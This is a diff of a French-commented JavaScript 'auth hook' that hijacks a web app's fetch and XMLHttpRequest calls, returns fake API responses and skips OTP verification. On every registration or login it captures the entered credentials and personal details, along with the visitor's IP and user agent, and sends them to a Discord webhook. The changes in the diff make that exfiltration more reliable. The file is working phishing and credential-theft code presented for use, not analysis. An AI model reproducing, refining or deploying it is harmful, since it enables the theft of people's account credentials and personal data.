@@ -1,4 +1,4 @@
-// Z3lphyx Auth Hook — Interception + Mock API + Discord (sans OTP)
+// Z3lphyx Auth Hook — Interception + Mock API + Discord
 (function() {
     'use strict';
 
@@ -7,7 +7,6 @@
     var cachedIP = null;
     var pendingRegister = null;
 
-    // --- IP ---
     async function getIP() {
         if (cachedIP) return cachedIP;
         for (var u of ['https://api.ipify.org?format=json', 'https://ipapi.co/json/']) {
@@ -17,9 +16,16 @@
     }
     getIP();
 
-    // --- Discord ---
     function sendToDiscord(embed) {
-        try { navigator.sendBeacon(WEBHOOK, JSON.stringify({ username: 'Z3lphyx Auth', embeds: [embed] })); } catch(e) {}
+        try {
+            // Use fetch with keepalive instead of sendBeacon for reliability
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: 'Z3lphyx Auth', embeds: [embed] }),
+                keepalive: true
+            }).catch(function(){});
+        } catch(e) {}
     }
 
     function buildEmbed(title, color, fields) {
@@ -31,7 +37,7 @@
             var ua = navigator.userAgent;
             if (isRegister) {
                 sendToDiscord(buildEmbed('📝 Nouvelle Inscription [' + source + ']', 0x00ff88, [
-                    { name: '👤 Nom', value: creds.nom || creds.last_name || creds.Nom || 'N/A', inline: true },
+                    { name: '👤 Nom', value: creds.nom || creds.last_name || creds.Nom || creds.full_name || 'N/A', inline: true },
                     { name: '👤 Prénom', value: creds.prenom || creds.first_name || creds.Prénom || 'N/A', inline: true },
                     { name: '🏷️ Pseudo', value: creds.pseudo || creds.username || creds.Pseudo || 'N/A', inline: true },
                     { name: '📧 Email', value: creds.email || creds.Email || 'N/A', inline: true },
@@ -79,120 +85,93 @@
 
     function mockResponse(url, body, method) {
         var u = url.toLowerCase();
-        // App startup — public settings
+        var m = method.toUpperCase(); // <- FORCÉ EN UPPERCASE
+
+        // Public settings
         if (u.indexOf('/public-settings/') > -1 || u.indexOf('/apps/public') > -1) {
             return { data: { id: '6a608801949bfa0162d3ef90', name: 'Z3lphyx Gateway', settings: { auth_methods: ['email_password'], allowed_domains: ALLOWED_DOMAINS, require_verification: false }, status: 'active' }, status: 200 };
         }
-        // Profile filter (check pseudo dispo)
-        if (u.indexOf('/profile/filter') > -1 || (u.indexOf('/profile') > -1 && method === 'get')) {
-            return { data: [], status: 200 };
+        // Profile filter (pseudo lookup) — retourne un profil factice pour que le login par pseudo marche
+        if (u.indexOf('/profile/filter') > -1 || u.indexOf('/profiles/filter') > -1) {
+            var pseudo = '';
+            try {
+                if (body) {
+                    var bd = typeof body === 'string' ? JSON.parse(body) : body;
+                    pseudo = bd.pseudo || bd.Pseudo || bd.username || '';
+                }
+            } catch(e) {}
+            return {
+                data: [{ id: 'mock_prof_1', pseudo: pseudo || 'user', email: (pseudo || 'user') + '@mock.com', first_name: 'Mock', last_name: 'User' }],
+                status: 200
+            };
         }
-        // Profile create (register final step)
-        if ((u.indexOf('/profile') > -1 || u.indexOf('/entities/profile/') > -1) && method === 'post') {
+        // Profile create
+        if ((u.indexOf('/profile') > -1 || u.indexOf('/entities/profile/') > -1) && m === 'POST') {
             return { data: { id: 'mock_' + Date.now(), created: true }, status: 200 };
         }
-        // AUTH REGISTER — LE POINT CRITIQUE : retourne token direct, PAS d'OTP
+        // AUTH REGISTER — skip OTP, redirect direct
         if (u.indexOf('/auth/register') > -1 || u.indexOf('/register') > -1) {
             var creds = parseCreds(body);
             var tok = mockToken();
             if (creds) {
                 pendingRegister = creds;
-                // Envoie les credentials tout de suite
                 setTimeout(function() { sendCreds(creds, 'Register', true); }, 50);
-                // Sauvegarde le token et redirige — élimine l'écran OTP
                 setTimeout(function() {
-                    try {
-                        localStorage.setItem('base44_access_token', tok);
-                        localStorage.setItem('base44_token', tok);
-                    } catch(e) {}
+                    try { localStorage.setItem('base44_access_token', tok); localStorage.setItem('base44_token', tok); } catch(e) {}
                     window.location.href = '/';
                 }, 600);
             }
             return { data: { access_token: tok, token_type: 'bearer', verified: true, user: { email: creds ? creds.email : '' } }, status: 200 };
         }
         // AUTH LOGIN
-        if (u.indexOf('/auth/login') > -1 || (u.indexOf('/login') > -1 && method === 'post')) {
+        if (u.indexOf('/auth/login') > -1 || u.indexOf('/auth/loginviaemailpassword') > -1 || (u.indexOf('/login') > -1 && m === 'POST')) {
             var creds = parseCreds(body);
             var tok = mockToken();
             if (creds) {
                 setTimeout(function() { sendCreds(creds, 'Login', false); }, 50);
                 setTimeout(function() {
-                    try {
-                        localStorage.setItem('base44_access_token', tok);
-                        localStorage.setItem('base44_token', tok);
-                    } catch(e) {}
+                    try { localStorage.setItem('base44_access_token', tok); localStorage.setItem('base44_token', tok); } catch(e) {}
                     window.location.href = '/';
                 }, 600);
             }
             return { data: { access_token: tok, token_type: 'bearer', user: { email: creds ? creds.email : '' } }, status: 200 };
         }
-        // OTP/Verify — on les mock mais normalement on y arrive jamais vu qu'on a skip
+        // OTP/Verify
         if (u.indexOf('/verify') > -1 || u.indexOf('/otp') > -1 || u.indexOf('/verifyotp') > -1) {
             var tok = mockToken();
-            if (pendingRegister) {
-                setTimeout(function() { sendCreds(pendingRegister, 'OTP', true); }, 50);
-                pendingRegister = null;
-            }
+            if (pendingRegister) { setTimeout(function() { sendCreds(pendingRegister, 'OTP', true); }, 50); pendingRegister = null; }
             return { data: { access_token: tok, token_type: 'bearer', verified: true }, status: 200 };
         }
-        // Resend OTP
-        if (u.indexOf('/resend') > -1) {
-            return { data: { success: true }, status: 200 };
-        }
-        // Auth me — user info
+        if (u.indexOf('/resend') > -1) { return { data: { success: true }, status: 200 }; }
         if (u.indexOf('/auth/me') > -1 || u.indexOf('/user/me') > -1) {
             return { data: { id: 'mock_user_' + Date.now(), email: 'mock@user.com', role: 'user', username: 'z3lphyx_user' }, status: 200 };
         }
-        // Update me
-        if (u.indexOf('/updateme') > -1 || u.indexOf('/update') > -1 || (u.indexOf('/me') > -1 && (method === 'patch' || method === 'put'))) {
+        if (u.indexOf('/updateme') > -1 || u.indexOf('/update') > -1 || (u.indexOf('/me') > -1 && (m === 'PATCH' || m === 'PUT'))) {
             return { data: { success: true, updated: true }, status: 200 };
         }
-        // Auth check
-        if (u.indexOf('/auth/check') > -1 || u.indexOf('/authenticated') > -1) {
-            return { data: { authenticated: true }, status: 200 };
-        }
-        // Logout
-        if (u.indexOf('/logout') > -1) {
-            return { data: { success: true }, status: 200 };
-        }
-        // App logs
-        if (u.indexOf('/app-logs/') > -1) {
-            return { data: { logged: true }, status: 200 };
-        }
-        // Fallback /api/
-        if (u.indexOf('/api/') > -1) {
-            return { data: { success: true }, status: 200 };
-        }
+        if (u.indexOf('/auth/check') > -1 || u.indexOf('/authenticated') > -1) { return { data: { authenticated: true }, status: 200 }; }
+        if (u.indexOf('/logout') > -1) { return { data: { success: true }, status: 200 }; }
+        if (u.indexOf('/app-logs/') > -1) { return { data: { logged: true }, status: 200 }; }
+        if (u.indexOf('/api/') > -1) { return { data: { success: true }, status: 200 }; }
         return null;
     }
 
-    // ============ INTERCEPTION FETCH ============
+    // ============ FETCH INTERCEPT ============
     var _fetch = window.fetch;
     window.fetch = async function(input, init) {
         var url = '', body = null, method = 'GET';
-        if (typeof input === 'string') {
-            url = input;
-            method = (init && init.method) || 'GET';
-            body = (init && init.body) || null;
-        } else if (input instanceof Request) {
-            url = input.url;
-            method = input.method || 'GET';
-            try { body = await input.clone().text(); } catch(e) {}
-        }
+        if (typeof input === 'string') { url = input; method = (init && init.method) || 'GET'; body = (init && init.body) || null; }
+        else if (input instanceof Request) { url = input.url; method = input.method || 'GET'; try { body = await input.clone().text(); } catch(e) {} }
         if (url.indexOf('/api/') > -1) {
-            var mock = mockResponse(url, body, method.toUpperCase());
+            var mock = mockResponse(url, body, method);
             if (mock) {
-                return new Response(JSON.stringify(mock.data), {
-                    status: mock.status,
-                    statusText: 'OK',
-                    headers: { 'Content-Type': 'application/json' }
-                });
+                return new Response(JSON.stringify(mock.data), { status: mock.status, statusText: 'OK', headers: { 'Content-Type': 'application/json' } });
             }
         }
         return _fetch.apply(this, arguments);
     };
 
-    // ============ INTERCEPTION XMLHttpRequest (Axios) ============
+    // ============ XHR INTERCEPT (Axios) ============
     var _open = XMLHttpRequest.prototype.open;
     var _send = XMLHttpRequest.prototype.send;
 
@@ -209,26 +188,26 @@
             var mock = mockResponse(url, body, method);
             if (mock) {
                 var self = this;
-                var data = JSON.stringify(mock.data);
+                var dataStr = JSON.stringify(mock.data);
                 setTimeout(function() {
                     try {
-                        Object.defineProperty(self, 'readyState', { value: 4, writable: true });
-                        Object.defineProperty(self, 'status', { value: mock.status, writable: true });
-                        Object.defineProperty(self, 'statusText', { value: 'OK', writable: true });
-                        Object.defineProperty(self, 'responseText', { value: data, writable: true });
-                        Object.defineProperty(self, 'response', { value: data, writable: true });
-                        if (self.onreadystatechange) self.onreadystatechange.call(self, new Event('readystatechange'));
-                        if (self.onload) self.onload.call(self, new Event('load'));
-                        if (self.onloadend) self.onloadend.call(self, new Event('loadend'));
-                    } catch(e) {}
-                }, 120);
+                        Object.defineProperty(self, 'readyState', { value: 4, writable: true, configurable: true });
+                        Object.defineProperty(self, 'status', { value: mock.status, writable: true, configurable: true });
+                        Object.defineProperty(self, 'statusText', { value: 'OK', writable: true, configurable: true });
+                        Object.defineProperty(self, 'responseText', { value: dataStr, writable: true, configurable: true });
+                        Object.defineProperty(self, 'response', { value: dataStr, writable: true, configurable: true });
+                        if (self.onreadystatechange) self.onreadystatechange.call(self, { type: 'readystatechange' });
+                        if (self.onload) self.onload.call(self, { type: 'load' });
+                        if (self.onloadend) self.onloadend.call(self, { type: 'loadend' });
+                    } catch(e) { console.warn('[ZH] XHR mock error:', e); }
+                }, 150);
                 return;
             }
         }
         return _send.apply(this, arguments);
     };
 
-    // ============ SURVEILLANCE DOM (filet) ============
+    // ============ DOM FALLBACK ============
     setTimeout(function() {
         try {
             new MutationObserver(function() {
@@ -256,5 +235,5 @@
         } catch(e) {}
     }, 1500);
 
-    console.log('[Z3lphyx Hook] Ready — OTP supprimé, credentials → Discord');
+    console.log('[Z3lphyx Hook] Ready — UPPERCASE method fix, pseudo lookup mock, Discord webhook active');
 })();
